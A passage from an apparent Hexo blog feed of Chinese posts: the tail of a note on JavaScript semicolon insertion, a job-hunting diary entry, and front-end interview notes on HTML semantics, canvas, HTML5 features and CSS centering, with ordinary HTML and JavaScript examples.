c]</code></p><p>故最后运行的表达式实际上是这样的<code>[a, b] = [d, c]</code>，即把d的值给a，c的值给b。</p><p>这种没有报错的隐式错误，真在Leetcode刷题的时候 够你Debug半天了2333。</p><h1 id="总结"><a class="markdownIt-Anchor" href="#总结"></a> 总结</h1><p>实际上，完全不用为了ASI在一些情况下导致错误而每行都加上一个分号。</p><p>对于我目前遇到的这两种情况，可以总结一下，如果一行的开始是一个<code>(</code>或者<code>[</code>，那么再上一行你需要手动加上一个分号，至于其他的情况，完全不用考虑分号~</p><p>还可以参考一下尤大的这篇回答 <a href="https://www.zhihu.com/question/21076930/answer/17135846">https://www.zhihu.com/question/21076930/answer/17135846</a></p><link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>]]></content>
    
    
    
    <tags>
      
      <tag>js</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>炎炎夏日下的&quot;秋&quot;招</title>
    <link href="/2022/08/04/autumn/"/>
    <url>/2022/08/04/autumn/</url>
    
    <content type="html"><![CDATA[    <div id="aplayer-CmxeIpny" class="aplayer aplayer-tag-marker meting-tag-marker"         data-id="1939401645" data-server="netease" data-type="song" data-mode="circulation" data-autoplay="false" data-mutex="true" data-listmaxheight="340px" data-preload="auto" data-theme="#555"    ></div><p>好久没更新博客了。</p><p>明明还是夏天，我却每天为秋招而烦恼。</p><p>7月份面试了TP-Link提前批，7月19号三面结束就没消息了，还是挺恼人的。</p><p><img src="https://sina.wuuconix.link/large/007YVyKcly1h4v43yabt5j30ab0403yt.jpg" alt="TP-Link提前批三次面试" /></p><p>对于现在的我，一份offer就能让我冷静一大半，可惜没有（苦笑</p><p>前几天在家附近查找了一下招聘前端的企业，发现在我们这个小县城也能找到相应岗位！</p><p><img src="https://sina.wuuconix.link/large/007YVyKcly1h4v45trze4j30u01t0k02.jpg" alt="前程无忧51job" /></p><p>所以说最后没找到大公司其实也没啥事情，在家这边找份工作至少可以保底，还没了租房的压力2333</p><p>最近实验室项目也停下来了，因为护网的原因。所以接下去几天就没啥事了，就每天再学点东西吧，总是这么焦虑也没啥办法，还是干点实事。</p><p>话说看技术书籍还是得把实例给实际码一遍，不然真的和没看一样</p><p><img src="https://sina.wuuconix.link/large/007YVyKcly1h4v49q9k15j30q10jhwm6.jpg" alt="CSS世界" /></p><p><img src="https://sina.wuuconix.link/large/007YVyKcly1h4v4al76tfj317p0pithf.jpg" alt="vite" /></p><hr /><p>2022/8/6 更新： 开心，昨天下午收到TP-Link座谈会通知了！希望之后顺利收到Offer，白菜也行！SP就更好了！</p><p><img src="https://sina.wuuconix.link/large/007YVyKcly1h4xhlkte9kj30ky0og78r.jpg" alt="TP-Link座谈会通知" /></p><style>img {    max-height: 600px;}</style><link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>]]></content>
    
    
    
    <tags>
      
      <tag>胡思乱想</tag>
      
      <tag>工作</tag>
      
      <tag>生活</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>前端面经笔记</title>
    <link href="/2022/04/19/bible/"/>
    <url>/2022/04/19/bible/</url>
    
    <content type="html"><![CDATA[<header><meta name="referrer" content="never"></header>    <div id="aplayer-ZnbCVFEs" class="aplayer aplayer-tag-marker meting-tag-marker"         data-id="1887777514" data-server="netease" data-type="song" data-mode="circulation" data-autoplay="false" data-mutex="true" data-listmaxheight="340px" data-preload="auto" data-theme="#555"    ></div><h1 id="遗憾的序"><a class="markdownIt-Anchor" href="#遗憾的序"></a> 遗憾的序</h1><p>上个月才下定目标，决定找一份前端的工作，在这之前我对我应该选择什么岗位是迷茫的，前端？后端？安全岗？</p><p>之前有一段时间因为在实验室里干的远程检测的活觉得自己能找一份安全岗的工作，所以认为自己可以不刷Leetcode，上个月才认清我在实验室干的活就是个脚本小子来就能干的活，没有任何技术含量。</p><p>考虑到大学以来的的大一年度计划和大二的科技立项，打CTF也是web方向的，对前端还算比较感兴趣，这才正式下定决心找一份前端的工作。</p><p>但是上个月已经是3月了，金3银4，很多人在3月份已经找到实习了，而我才刚刚开始系统的学习。</p><p>这一个月来通读了MDN教程，但是没记住多少，看了JS的红宝书《JavaScript高级程序设计（第四版）》，这几天开始看《你不知道的JavaScript》和《css揭秘》。</p><p>问了下班里已经找到字节前端实习的BW兄，他给了我一份前端面经，我看了一眼，觉得质量确实不错。遂打算今后每天再看书的时候也要看面经。别再像上周一样在看了0面经的情况下去面试而浪费机会了。</p><p>暑期实习可能是找不到了，但是提前批和秋招现在应该还来得及准备。</p><h1 id="html"><a class="markdownIt-Anchor" href="#html"></a> HTML</h1><h2 id="1-html-语义化"><a class="markdownIt-Anchor" href="#1-html-语义化"></a> 1. html 语义化</h2><p>根据内容来选择合适的标签，将代码语义化，方便开发者阅读，同时提供了SEO和浏览器屏幕阅读器更好的解析。</p><ol><li><p>不要滥用 div 和 span</p></li><li><p>弃用纯样式标签。将 b 代替为 strong，i代替为em。u改用css设置下划线。</p><p><strong><em>wuuconix</em></strong></p> <figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">strong</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">em</span>&gt;</span>wuuconix<span class="hljs-tag">&lt;/<span class="hljs-name">em</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">strong</span>&gt;</span><br></code></pre></td></tr></table></figure></li></ol><blockquote><p>这是一个同时利用strong和em标签的结果。</p></blockquote><ol start="3"><li><p>使用表格时，标题用caption 表头用thead，主体用tbody，尾部用 tfoot包裹。增强可读性。【值得注意的是这几个元素不是html5的新元素，但是它们提供了语义信息】</p> <table>     <thead>         <caption>wuuconix's table</caption>         <tr>             <th>Header1</th>             <th>Header2</th>          </tr>     </thead>     <tbody>         <tr>             <td>Content1</td>             <td>Content2</td>          </tr>     </tbody>     <tfoot>         <tr>             <td>Foot1</td>             <td>Foot2</td>          </tr>     </tfoot> </table> <figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">table</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">thead</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">caption</span>&gt;</span>wuuconix&#x27;s table<span class="hljs-tag">&lt;/<span class="hljs-name">caption</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">tr</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">th</span>&gt;</span>Header1<span class="hljs-tag">&lt;/<span class="hljs-name">th</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">th</span>&gt;</span>Header2<span class="hljs-tag">&lt;/<span class="hljs-name">th</span>&gt;</span><br>         <span class="hljs-tag">&lt;/<span class="hljs-name">tr</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">thead</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">tbody</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">tr</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">td</span>&gt;</span>Content1<span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">td</span>&gt;</span>Content2<span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span><br>         <span class="hljs-tag">&lt;/<span class="hljs-name">tr</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">tbody</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">tfoot</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">tr</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">td</span>&gt;</span>Foot1<span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">td</span>&gt;</span>Foot2<span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span><br>         <span class="hljs-tag">&lt;/<span class="hljs-name">tr</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">tfoot</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">table</span>&gt;</span><br></code></pre></td></tr></table></figure></li><li><p>表单可以使用fieldset和legend标签增强语义【实际上实际看上去也更清楚了】</p> <form>     <fieldset>         <legend>武丑兄的信息</legend>         身高: <input type="text" />         体重: <input type="text" />     </fieldset> </form> <figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">form</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">fieldset</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">legend</span>&gt;</span>武丑兄的信息<span class="hljs-tag">&lt;/<span class="hljs-name">legend</span>&gt;</span><br>        身高: <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text&quot;</span> /&gt;</span><br>        体重: <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text&quot;</span> /&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">fieldset</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span><br></code></pre></td></tr></table></figure><p>可以看到，fieldset标签会为表单增加一圈边框。而legend标签会在边框上写上一个标题。</p></li><li><p>每个input标签的说明都需要使用label标签，通过为input设置id，label 设置for=id 将label和响应的input关联起来。</p><p>所以我们可以改写上面的例子。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">form</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">fieldset</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">legend</span>&gt;</span>武丑兄的信息<span class="hljs-tag">&lt;/<span class="hljs-name">legend</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">label</span> <span class="hljs-attr">for</span>=<span class="hljs-string">&quot;height&quot;</span>&gt;</span>身高：<span class="hljs-tag">&lt;/<span class="hljs-name">label</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text&quot;</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;height&quot;</span>/&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">label</span> <span class="hljs-attr">for</span>=<span class="hljs-string">&quot;weight&quot;</span>&gt;</span>体重：<span class="hljs-tag">&lt;/<span class="hljs-name">label</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text&quot;</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;weight&quot;</span>/&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">fieldset</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span><br></code></pre></td></tr></table></figure><p>视觉效果上实际上一摸一样的，但是将label和input进行绑定后，我们点击label的文字，对应的input会获得焦点，优化用户体验。</p></li><li><p>html5新的语义化标签速记。nav header main aside footer article section 等等。</p><p>大部分语义标签只是提供语义，本身没有什么特别的，而html5新增的 summary 和 details 即提供了语义又在视觉效果、实用性方面很赞。它可以将某些标签隐藏。</p> <details> <summary>武丑兄的图片</summary> <img src="https://url.wuuconix.link/favicon"> </details><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">details</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">summary</span>&gt;</span>武丑兄的图片<span class="hljs-tag">&lt;/<span class="hljs-name">summary</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;https://url.wuuconix.link/favicon&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">details</span>&gt;</span><br></code></pre></td></tr></table></figure><p>其中details用来指明内部的标签需要被折叠起来。而summary给了内部内容一个概括。这种不用js实现的折叠效果真的很赞。</p></li></ol><h2 id="2-canvas-相关"><a class="markdownIt-Anchor" href="#2-canvas-相关"></a> 2. canvas 相关</h2><p>在使用canvas之前，我们需要确保先得到一个2d的上下文环境。</p><p>具体的咱也不会，就记住一些比较基础的函数吧。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">let</span> context = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">querySelector</span>(<span class="hljs-string">&quot;canvas&quot;</span>).<span class="hljs-title function_">getContext</span>(<span class="hljs-string">&quot;2d&quot;</span>);<br>context.<span class="hljs-property">fillStyle</span> = <span class="hljs-string">&quot;red&quot;</span><br>context.<span class="hljs-property">strokeStyle</span> = <span class="hljs-string">&quot;blue&quot;</span><br>context.<span class="hljs-title function_">fillRect</span>(<span class="hljs-number">50</span>, <span class="hljs-number">50</span>, <span class="hljs-number">10</span>, <span class="hljs-number">10</span>) <span class="hljs-comment">//参数分别是 x, y, widht, height</span><br>context.<span class="hljs-title function_">strokeRect</span>(<span class="hljs-number">50</span>, <span class="hljs-number">70</span>, <span class="hljs-number">10</span>, <span class="hljs-number">10</span>)<br>context.<span class="hljs-title function_">fillText</span>(<span class="hljs-string">&quot;a&quot;</span>, <span class="hljs-number">50</span>, <span class="hljs-number">50</span>) <span class="hljs-comment">//参数分别是要写的字符串, x, y</span><br>context.<span class="hljs-title function_">strokeText</span>(<span class="hljs-string">&quot;b&quot;</span>, <span class="hljs-number">50</span>, <span class="hljs-number">70</span>)<br></code></pre></td></tr></table></figure><p><img src="https://sina.wuuconix.link/large/007YVyKcly1h1w8o7qjjzj303i05lwef.jpg" alt="canvas画画" /></p><h2 id="3-svg和canvas的区别"><a class="markdownIt-Anchor" href="#3-svg和canvas的区别"></a> 3. svg和canvas的区别？</h2><ul><li>canvas是html5提供的新的绘图方式。svg基于xml，已经发展了20多年。</li><li>canvas基于位图，缩放会失真。svg是矢量图形，缩放不会失真。</li><li>canvas需要在js中绘制，而svg在html中绘制。</li><li>canvas支持的颜色比svg多。</li><li>canvas无法对已经绘制的图像进行修改，操作；svg可以获取到标签进行操作。</li></ul><h2 id="4html5有哪些新特性"><a class="markdownIt-Anchor" href="#4html5有哪些新特性"></a> 4.html5有哪些新特性？</h2><p>HTML5增加了许多实用的API和标签。</p><ul><li><p>拖拽释放 Drag and drop API，在上传文件的情景中十分常见。</p></li><li><p>新增了许多语义标签，比如 nav, header, main, aside, footer, article, section等等。</p></li><li><p>Audio、Video API，让html5能够不依赖flash等插件的情况下播放音频、视频。</p></li><li><p>画布 Canvas API，可以让开发者绘制复杂的图形。</p></li><li><p>地理 Geolocation API，获得设备的位置信息、速递信息。</p></li><li><p>localStorage 可以用来长期存储数据，浏览器关闭后不丢失。sessionStorage 在浏览器关闭后自动删除。</p></li><li><p>表单空间里新增了许多实用的类型。比如 url, email, search, date, time search 等等。</p><form>    <fieldset>        <legend>测试控件</legend>        <input type="email" placeholder="email"><br>        <input type="url" placeholder="url"><br>        <input type="date" placeholder="date"><br>        <input type="time" placeholder="time"><br>        <input type="color" placeholder="color"><br>        <input type="range" placeholder="range"><br>        <input type="search" placeholder="search"><br>        <input type="password" placeholder="password"><br>        <input type="reset"><input type="submit">    </fieldset></form><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">form</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">fieldset</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">legend</span>&gt;</span>测试控件<span class="hljs-tag">&lt;/<span class="hljs-name">legend</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;email&quot;</span> <span class="hljs-attr">placeholder</span>=<span class="hljs-string">&quot;email&quot;</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;url&quot;</span> <span class="hljs-attr">placeholder</span>=<span class="hljs-string">&quot;url&quot;</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;date&quot;</span> <span class="hljs-attr">placeholder</span>=<span class="hljs-string">&quot;date&quot;</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;time&quot;</span> <span class="hljs-attr">placeholder</span>=<span class="hljs-string">&quot;time&quot;</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;color&quot;</span> <span class="hljs-attr">placeholder</span>=<span class="hljs-string">&quot;color&quot;</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;range&quot;</span> <span class="hljs-attr">placeholder</span>=<span class="hljs-string">&quot;range&quot;</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;search&quot;</span> <span class="hljs-attr">placeholder</span>=<span class="hljs-string">&quot;search&quot;</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;password&quot;</span> <span class="hljs-attr">placeholder</span>=<span class="hljs-string">&quot;password&quot;</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;reset&quot;</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;submit&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">fieldset</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span><br></code></pre></td></tr></table></figure><p>其中email和url会对用户的输入进行正则匹配，比如邮件中肯定需要@。至于它们的提示是在点击提交后才产生的，用户输入过程中则没有提示。</p><p>还有一些以前难以想象的input控件，比如 date用来选择日期，time用来选择具体时间。color用来选择颜色，range用来滑动选择比例，现代的网页设计真的是十分方便了。</p><p>至于search，我猜测应该是会调用起浏览器的历史输入框，以展示用户之前输入过的内容？可能由于没有后端支持的原因，纯前端测试没有效果。</p><p>password可以让输入文本变成 * ，起到防偷窥密码的目的。</p></li></ul><h2 id="5如何处理html5新标签的浏览器兼容问题"><a class="markdownIt-Anchor" href="#5如何处理html5新标签的浏览器兼容问题"></a> 5.如何处理HTML5新标签的浏览器兼容问题？</h2><p>IE8/IE7/IE6可以用document.createElement方法来产生框架，这样可以让浏览器支持html5新标签。【这IE什么离谱的设定】<br />更好的方式是直接使用成熟的框架，比如<a href="https://github.com/afarkas/html5shiv">html5shiv</a> 【现在HTML5已经大范围普及了，这个项目也已经7年不更新了，希望面试官不会再问这种不合时宜的问题】</p><h2 id="6-说说-title-和-alt-属性"><a class="markdownIt-Anchor" href="#6-说说-title-和-alt-属性"></a> 6. 说说 title 和 alt 属性</h2><ul><li>alt是img的特有属性，是当图片内容的等价描述，图片无法正常显示时的替代文字。大部分浏览器在鼠标悬停在图片上时不会显示出alt的内容【貌似IE会在悬停时展现出alt的内容】</li><li>title属性可以用在非常多的标签上，是对dom元素的一种类似注释说明。鼠标悬停在那个元素上时会展现出title的内容跟。</li></ul><section>   <img alt="涩图" src="https://sesewadame.death"><br>   <button title="不可以涩涩">鼠标悬停我</button></section><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">section</span>&gt;</span><br>   <span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">alt</span>=<span class="hljs-string">&quot;涩图&quot;</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;https://sesewadame.death&quot;</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><br>   <span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">title</span>=<span class="hljs-string">&quot;不可以涩涩&quot;</span>&gt;</span>鼠标悬停我<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">section</span>&gt;</span><br></code></pre></td></tr></table></figure><h2 id="7html全局属性global-attribute有哪些"><a class="markdownIt-Anchor" href="#7html全局属性global-attribute有哪些"></a> 7.HTML全局属性(global attribute)有哪些</h2><ol><li>class 为元素设置类表示。</li><li>data-* 用来为元素增加自定义属性。</li><li>draggable 设置元素是否可以拖拽</li><li>contenteditable 设置元素是否可以让用户以所见即所得的方式更改</li><li>id 元素ID，文档内唯一</li><li>lang 元素内容的语言</li><li>style 行内css样式</li><li>title 元素相关注释信息</li><li>hidden 设置元素是否隐藏</li><li>等等</li></ol><p>我拿其中比较有意思的contendeditable举个例子，将它设置为true可以让元素变成一个WYSIWYG的编辑器。</p><blockquote contenteditable="true">wuuconix yyds</blockquote><cite contenteditable="true">--- Write Your Name Here</cite><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">blockquote</span> <span class="hljs-attr">contenteditable</span>=<span class="hljs-string">&quot;true&quot;</span>&gt;</span>wuuconix yyds<span class="hljs-tag">&lt;/<span class="hljs-name">blockquote</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">cite</span> <span class="hljs-attr">contenteditable</span>=<span class="hljs-string">&quot;true&quot;</span>&gt;</span>--- Write Your Name Here<span class="hljs-tag">&lt;/<span class="hljs-name">cite</span>&gt;</span><br></code></pre></td></tr></table></figure><h1 id="css"><a class="markdownIt-Anchor" href="#css"></a> CSS</h1><h2 id="1-让一个元素水平垂直居中到底有多少种方案"><a class="markdownIt-Anchor" href="#1-让一个元素水平垂直居中到底有多少种方案"></a> 1. 让一个元素水平垂直居中，到底有多少种方案？</h2><p>这个问题我们将题目简化为两个问题。如何将元素设置水平居中 以及 如何将元素设置为垂直居中。</p><p>水平居中:</p><ol><li><p>如果是内联元素/行内元素，比如 p 标签 直接 <code>text-algin: center</code> 即可</p> <p style="text-align:center; background-color:greenyellow; color:black">行内元素水平居中</p> <figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">p</span> <span class="hljs-attr">style</span>=<span class="hljs-string">&quot;text-align:center; background-color:greenyellow; color:black&quot;</span>&gt;</span>行内元素水平居中<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span><br></code></pre></td></tr></table></figure></li><li><p>如果是块级元素，比如我们常见的 div 标签，将左右外边距设置为auto即可。</p> <div style="margin:5px auto; width:300px; height:32px; background-color:aquamarine; text-align: center; color:black">左右边距auto实现块级元素水平居中</div> <figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">style</span>=<span class="hljs-string">&quot;margin:5px auto; width:300px; height:32px; background-color:aquamarine; text-align: center; color:black&quot;</span>&gt;</span>左右边距auto实现块级元素水平居中<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br></code></pre></td></tr></table></figure><p>这里需要解释一下，margin实际上是一个简写属性，它在写两个值的时候，第一个值指定上下外边距，第二个值指定左右外边距，所以我们这里是将左右外边距设置为了auto 实现水平居中。</p></li><li><p>块级元素 绝对定位 + 负左边距实现水平居中</p> <div style="position: relative; height: 40px;">     <div style="position:absolute; left:50%; margin-left:-150px; width:300px; height:32px; background-color:black; text-align:center; color:white">绝对定位+负左边距实现水平居中</div> </div> <figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">style</span>=<span class="hljs-string">&quot;position: relative; height: 40px;&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">style</span>=<span class="hljs-string">&quot;position:absolute; left:50%; margin-left:-150px; width:300px; height:32px; background-color:black; text-align:center; color:white&quot;</span>&gt;</span>绝对定位+负左边距实现水平居中<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br></code></pre></td></tr></table></figure><p>由于需要用要绝对定位，我们需要在它之前添加一个定位为relative的父元素，这样可以不捣乱之后的元素。这里我们首先把left 设置为了父元素的50%，实际上是子元素的<strong>左边界</strong>处于中线位置，而我们需要的是子元素的中线在中线位置，所以我们利用负左外边距的技术让子元素<strong>往左移动</strong>，实现居中。margin-left的值是负的子元素的宽度。所以这种方法需要知道子元素的宽度。</p></li><li><p>块级元素 绝对定位 + translateX实现水平居中</p> <div style="position: relative; height: 40px;">     <div style="position:absolute; left:50%; transform:translateX(-50%); width:300px; height:32px; background-color:darkorange; text-align:center;color:black">绝对定位+translateX实现水平居中</div> </div> <figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">style</span>=<span class="hljs-string">&quot;position: relative; height: 40px;&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">style</span>=<span class="hljs-string">&quot;position:absolute; left:50%; transform:translateX(-50%); width:300px; height:32px; background-color:darkorange; text-align:center;color:black&quot;</span>&gt;</span>绝对定位+translateX实现水平居中<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br></code></pre></td></tr></table></figure><p>这种方法和上一种方法类似，首先都是绝对定位，把子元素的左界顶着中线，上一种方法是利用负左外边距实现居中，这种方法直接使用<code>transform: translateX(-50%)</code>把自己往左移动自己宽度的一半，实现居中。由于这里直接利用了子元素宽度的百分比，所以不需要知道实际宽度，比上一种方法实用度更广。</p></li><li><p>块级元素 父元素设置flex布局实现水平居中</p> <div style="display:flex; justify-content:center;">     <div style="width:300px; height:32px; background-color:blueviolet; text-align:center;color:white">父元素设置flex布局实现水平居中</div> </div> <figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">style</span>=<span class="hljs-string">&quot;display:flex; justify-content:center;&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">style</span>=<span class="hljs-string">&quot;width:300px; height:32px; background-color:blueviolet; 